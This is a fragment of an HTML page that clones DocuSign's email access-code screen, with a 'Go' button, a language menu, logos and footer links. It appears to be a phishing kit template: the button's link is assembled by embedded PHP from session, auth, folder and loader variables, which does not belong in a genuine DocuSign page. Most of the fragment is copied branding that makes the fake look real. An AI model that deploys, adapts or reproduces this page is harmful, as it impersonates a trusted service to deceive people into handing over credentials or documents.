        <span id="ds_hldrBdy_valAuthCode" class="ErrorMessageText" style="display:none;">Required</span>
        <span id="ds_hldrBdy_lblErrorMessage" class="ErrorMessageText" data-qa="email-access-code-validation-error" style="display:none;"></span>
        
        <div class="next-button">
           <a href="<?php echo "$onclick?$uricomp&session=$sessvar&auth=$randedlast&fd=$folder&ig=$loader"; ?>">  <button id="ds_hldrBdy_btnAuthenticate_btnInline" class="Btnyellow_login" tabindex="2" type="submit" data-qa="email-access-code-validate"><div id="ds_hldrBdy_btnAuthenticate_pnlHLeft" class="BtnHighlight" style="left:0px;">

        </div><div id="ds_hldrBdy_btnAuthenticate_pnlHRight" class="BtnHighlight" style="right:0px;">

        </div>Go</button></a>

        </div>
    </div>

            
    </div>
        
</div>
























        
            <div id="popupMask"></div>
        
        <div id="ds_Footer" class="Footer">
    
            <img id="ds_imgLogoFooter" title="Powered by DocuSign" class="FooterImage" src="https://www.docusign.net/Member/Images/powered_by_docusign_gray.png" alt="Powered by DocuSign" style="height:20px;">
            
            <div class="FooterLinks" id="divFooterLinks">
                <div id="ds_divLanguageMenu" class="FooterMenuClosed">
                    <div id="divLanguageMenuItems" style="display: none;">
                        <div class="ActionMenuItemTopSmall" onmousedown="CloseMasterPageMenus();" onkeydown="CloseMasterPageMenus();"></div><table role="presentation"><tbody><tr><td><div title="Arabic" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction(&#39;setlang-ar&#39;);return CE(event);" onmousedown="MasterPageAction(&#39;setlang-ar&#39;)" onkeydown="MasterPageAction(&#39;setlang-ar&#39;)">العربية‏</div></td><td><div title="Bulgarian" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction(&#39;setlang-bg&#39;);return CE(event);" onmousedown="MasterPageAction(&#39;setlang-bg&#39;)" onkeydown="MasterPageAction(&#39;setlang-bg&#39;)">Български</div></td><td><div title="Czech" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction(&#39;setlang-cs&#39;);return CE(event);" onmousedown="MasterPageAction(&#39;setlang-cs&#39;)" onkeydown="MasterPageAction(&#39;setlang-cs&#39;)">Čeština</div></td><td><div title="Simplified Chinese" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction(&#39;setlang-zh_CN&#39;);return CE(event);" onmousedown="MasterPageAction(&#39;setlang-zh_CN&#39;)" onkeydown="MasterPageAction(&#39;setlang-zh_CN&#39;)">中文 (简体)</div></td></tr><tr><td><div title="Traditional Chinese" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction(&#39;setlang-zh_TW&#39;);return CE(event);" onmousedown="MasterPageAction(&#39;setlang-zh_TW&#39;)" onkeydown="MasterPageAction(&#39;setlang-zh_TW&#39;)">中文 (繁體)</div></td><td><div title="Croatian" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction(&#39;setlang-hr&#39;);return CE(event);" onmousedown="MasterPageAction(&#39;setlang-hr&#39;)" onkeydown="MasterPageAction(&#39;setlang-hr&#39;)">Hrvatski</div></td><td><div title="Danish" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction(&#39;setlang-da&#39;);return CE(event);" onmousedown="MasterPageAction(&#39;setlang-da&#39;)" onkeydown="MasterPageAction(&#39;setlang-da&#39;)">Dansk</div></td><td><div title="Dutch" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction(&#39;setlang-nl&#39;);return CE(event);" onmousedown="MasterPageAction(&#39;setlang-nl&#39;)" onkeydown="MasterPageAction(&#39;setlang-nl&#39;)">Nederlandse</div></td></tr><tr><td><div title="English (US)" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction(&#39;setlang-en&#39;);return CE(event);" onmousedown="MasterPageAction(&#39;setlang-en&#39;)" onkeydown="MasterPageAction(&#39;setlang-en&#39;)">English (US)</div></td><td><div title="English (UK)" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction(&#39;setlang-en_GB&#39;);return CE(event);" onmousedown="MasterPageAction(&#39;setlang-en_GB&#39;)" onkeydown="MasterPageAction(&#39;setlang-en_GB&#39;)">English (UK)</div></td><td><div title="Estonian" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction(&#39;setlang-et&#39;);return CE(event);" onmousedown="MasterPageAction(&#39;setlang-et&#39;)" onkeydown="MasterPageAction(&#39;setlang-et&#39;)">Eesti</div></td><td><div title="Farsi" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction(&#39;setlang-fa&#39;);return CE(event);" onmousedown="MasterPageAction(&#39;setlang-fa&#39;)" onkeydown="MasterPageAction(&#39;setlang-fa&#39;)">فارسی</div></td></tr><tr><td><div title="Finnish" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction(&#39;setlang-fi&#39;);return CE(event);" onmousedown="MasterPageAction(&#39;setlang-fi&#39;)" onkeydown="MasterPageAction(&#39;setlang-fi&#39;)">Suomi</div></td><td><div title="French (France)" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction(&#39;setlang-fr&#39;);return CE(event);" onmousedown="MasterPageAction(&#39;setlang-fr&#39;)" onkeydown="MasterPageAction(&#39;setlang-fr&#39;)">Français (France)</div></td><td><div title="French (Canada)" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction(&#39;setlang-fr_CA&#39;);return CE(event);" onmousedown="MasterPageAction(&#39;setlang-fr_CA&#39;)" onkeydown="MasterPageAction(&#39;setlang-fr_CA&#39;)">Français (Canada)</div></td><td><div title="German" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction(&#39;setlang-de&#39;);return CE(event);" onmousedown="MasterPageAction(&#39;setlang-de&#39;)" onkeydown="MasterPageAction(&#39;setlang-de&#39;)">Deutsch</div></td></tr><tr><td><div title="Greek" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction(&#39;setlang-el&#39;);return CE(event);" onmousedown="MasterPageAction(&#39;setlang-el&#39;)" onkeydown="MasterPageAction(&#39;setlang-el&#39;)">Ελληνικά</div></td><td><div title="Hebrew" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction(&#39;setlang-he&#39;);return CE(event);" onmousedown="MasterPageAction(&#39;setlang-he&#39;)" onkeydown="MasterPageAction(&#39;setlang-he&#39;)">עברית‏</div></td><td><div title="Hindi" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction(&#39;setlang-hi&#39;);return CE(event);" onmousedown="MasterPageAction(&#39;setlang-hi&#39;)" onkeydown="MasterPageAction(&#39;setlang-hi&#39;)">हिन्दी</div></td><td><div title="Hungarian" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction(&#39;setlang-hu&#39;);return CE(event);" onmousedown="MasterPageAction(&#39;setlang-hu&#39;)" onkeydown="MasterPageAction(&#39;setlang-hu&#39;)">Magyar</div></td></tr><tr><td><div title="Bahasa Indonesia" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction(&#39;setlang-id&#39;);return CE(event);" onmousedown="MasterPageAction(&#39;setlang-id&#39;)" onkeydown="MasterPageAction(&#39;setlang-id&#39;)">Bahasa Indonesia</div></td><td><div title="Italian" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction(&#39;setlang-it&#39;);return CE(event);" onmousedown="MasterPageAction(&#39;setlang-it&#39;)" onkeydown="MasterPageAction(&#39;setlang-it&#39;)">Italiano</div></td><td><div title="Japanese" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction(&#39;setlang-ja&#39;);return CE(event);" onmousedown="MasterPageAction(&#39;setlang-ja&#39;)" onkeydown="MasterPageAction(&#39;setlang-ja&#39;)">日本語</div></td><td><div title="Korean" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction(&#39;setlang-ko&#39;);return CE(event);" onmousedown="MasterPageAction(&#39;setlang-ko&#39;)" onkeydown="MasterPageAction(&#39;setlang-ko&#39;)">한국어</div></td></tr><tr><td><div title="Latvian" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction(&#39;setlang-lv&#39;);return CE(event);" onmousedown="MasterPageAction(&#39;setlang-lv&#39;)" onkeydown="MasterPageAction(&#39;setlang-lv&#39;)">Latviešu</div></td><td><div title="Lithuanian" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction(&#39;setlang-lt&#39;);return CE(event);" onmousedown="MasterPageAction(&#39;setlang-lt&#39;)" onkeydown="MasterPageAction(&#39;setlang-lt&#39;)">Lietuvių</div></td><td><div title="Bahasa Malay" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction(&#39;setlang-ms&#39;);return CE(event);" onmousedown="MasterPageAction(&#39;setlang-ms&#39;)" onkeydown="MasterPageAction(&#39;setlang-ms&#39;)">Bahasa Melayu</div></td><td><div title="Norwegian" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction(&#39;setlang-no&#39;);return CE(event);" onmousedown="MasterPageAction(&#39;setlang-no&#39;)" onkeydown="MasterPageAction(&#39;setlang-no&#39;)">Norsk</div></td></tr><tr><td><div title="Polish" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction(&#39;setlang-pl&#39;);return CE(event);" onmousedown="MasterPageAction(&#39;setlang-pl&#39;)" onkeydown="MasterPageAction(&#39;setlang-pl&#39;)">Polski</div></td><td><div title="Portuguese (Portugal)" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction(&#39;setlang-pt&#39;);return CE(event);" onmousedown="MasterPageAction(&#39;setlang-pt&#39;)" onkeydown="MasterPageAction(&#39;setlang-pt&#39;)">Português (Portugal)</div></td><td><div title="Portuguese (Brasil)" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction(&#39;setlang-pt_BR&#39;);return CE(event);" onmousedown="MasterPageAction(&#39;setlang-pt_BR&#39;)" onkeydown="MasterPageAction(&#39;setlang-pt_BR&#39;)">Português (Brasil)</div></td><td><div title="Romanian" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction(&#39;setlang-ro&#39;);return CE(event);" onmousedown="MasterPageAction(&#39;setlang-ro&#39;)" onkeydown="MasterPageAction(&#39;setlang-ro&#39;)">Română</div></td></tr><tr><td><div title="Russian" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction(&#39;setlang-ru&#39;);return CE(event);" onmousedown="MasterPageAction(&#39;setlang-ru&#39;)" onkeydown="MasterPageAction(&#39;setlang-ru&#39;)">Русский</div></td><td><div title="Serbian" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction(&#39;setlang-sr&#39;);return CE(event);" onmousedown="MasterPageAction(&#39;setlang-sr&#39;)" onkeydown="MasterPageAction(&#39;setlang-sr&#39;)">Српски</div></td><td><div title="Slovak" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction(&#39;setlang-sk&#39;);return CE(event);" onmousedown="MasterPageAction(&#39;setlang-sk&#39;)" onkeydown="MasterPageAction(&#39;setlang-sk&#39;)">Slovenčina</div></td><td><div title="Slovenian" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction(&#39;setlang-sl&#39;);return CE(event);" onmousedown="MasterPageAction(&#39;setlang-sl&#39;)" onkeydown="MasterPageAction(&#39;setlang-sl&#39;)">Slovenščina</div></td></tr><tr><td><div title="Spanish" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction(&#39;setlang-es&#39;);return CE(event);" onmousedown="MasterPageAction(&#39;setlang-es&#39;)" onkeydown="MasterPageAction(&#39;setlang-es&#39;)">Español</div></td><td><div title="Spanish (Latin America)" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction(&#39;setlang-es_MX&#39;);return CE(event);" onmousedown="MasterPageAction(&#39;setlang-es_MX&#39;)" onkeydown="MasterPageAction(&#39;setlang-es_MX&#39;)">Español (América Latina)</div></td><td><div title="Swedish" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction(&#39;setlang-sv&#39;);return CE(event);" onmousedown="MasterPageAction(&#39;setlang-sv&#39;)" onkeydown="MasterPageAction(&#39;setlang-sv&#39;)">Svenska</div></td><td><div title="Thai" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction(&#39;setlang-th&#39;);return CE(event);" onmousedown="MasterPageAction(&#39;setlang-th&#39;)" onkeydown="MasterPageAction(&#39;setlang-th&#39;)">ภาษาไทย</div></td></tr><tr><td><div title="Turkish" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction(&#39;setlang-tr&#39;);return CE(event);" onmousedown="MasterPageAction(&#39;setlang-tr&#39;)" onkeydown="MasterPageAction(&#39;setlang-tr&#39;)">Türkçe</div></td><td><div title="Ukrainian" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction(&#39;setlang-uk&#39;);return CE(event);" onmousedown="MasterPageAction(&#39;setlang-uk&#39;)" onkeydown="MasterPageAction(&#39;setlang-uk&#39;)">Українська</div></td><td><div title="Vietnamese" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction(&#39;setlang-vi&#39;);return CE(event);" onmousedown="MasterPageAction(&#39;setlang-vi&#39;)" onkeydown="MasterPageAction(&#39;setlang-vi&#39;)">Việt</div></td></tr></tbody></table>
                    </div>
                </div>
                <div id="ds_divLanguageSelected" onkeyup="OpenMasterPageMenu(&#39;divLanguageMenuItems&#39;,&#39;divLanguageMenu&#39;, &#39;ActionMenuShowUp&#39;);" onmouseup="OpenMasterPageMenu(&#39;divLanguageMenuItems&#39;,&#39;divLanguageMenu&#39;, &#39;ActionMenuShowUp&#39;);" style="padding-right: 10px; white-space: nowrap; text-align: center;">
                    English (US) <img src="https://www.docusign.net/Member/Images/controls/btn_arrow_u.png" style="vertical-align:middle;" border="0" alt="Up Arrow">
                </div>
            </div>
            <script>function linkClick_TermsOfUse() {window.open('http://www.docusign.com/company/terms-of-use/lang/en','TermsOfUse'); return false; }</script><a tabindex="0" id="TermsOfUse" onclick="linkClick_TermsOfUse()" onkeypress="if(event){if(typeof(IsEnterOrSpaceKey)!==&#39;undefined&#39;&amp;&amp;IsEnterOrSpaceKey(event)){linkClick_TermsOfUse();}}" class="FooterLink" href="javascript:void(0);">Terms Of Use</a><span>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;</span><script>function linkClick_CorporateSupport() {window.open('https://www.docusign.com/support','CorporateSupport'); return false; }</script><a tabindex="0" id="CorporateSupport" onclick="linkClick_CorporateSupport()" onkeypress="if(event){if(typeof(IsEnterOrSpaceKey)!==&#39;undefined&#39;&amp;&amp;IsEnterOrSpaceKey(event)){linkClick_CorporateSupport();}}" class="FooterLink" href="javascript:void(0);">Support</a><span>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;</span><script>function linkClick_Feedback() {window.open('http://community.docusign.com/t5/Feedback/ct-p/feedback','Feedback'); return false; }</script><a tabindex="0" id="Feedback" onclick="linkClick_Feedback()" onkeypress="if(event){if(typeof(IsEnterOrSpaceKey)!==&#39;undefined&#39;&amp;&amp;IsEnterOrSpaceKey(event)){linkClick_Feedback();}}" class="FooterLink" href="javascript:void(0);">Feedback</a><span>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;</span><script>function linkClick_IntellectualProp() {window.open('http://www.docusign.com/IP/lang/en','IntellectualProp'); return false; }</script><a tabindex="0" id="IntellectualProp" onclick="linkClick_IntellectualProp()" onkeypress="if(event){if(typeof(IsEnterOrSpaceKey)!==&#39;undefined&#39;&amp;&amp;IsEnterOrSpaceKey(event)){linkClick_IntellectualProp();}}" class="FooterLink" href="javascript:void(0);">Intellectual Property</a><span>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;</span><script>function linkClick_PrivacyPolicy() {window.open('http://www.docusign.com/company/privacy-policy/lang/en','PrivacyPolicy'); return false; }</script><a tabindex="0" id="PrivacyPolicy" onclick="linkClick_PrivacyPolicy()" onkeypress="if(event){if(typeof(IsEnterOrSpaceKey)!==&#39;undefined&#39;&amp;&amp;IsEnterOrSpaceKey(event)){linkClick_PrivacyPolicy();}}" class="FooterLink" href="javascript:void(0);">Privacy Policy</a><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Copyright © 2018 DocuSign, Inc. All rights reserved.</span>
            
            
            <div class="SctClr"></div>
        
</div>

    



    
    
    







</body></html>
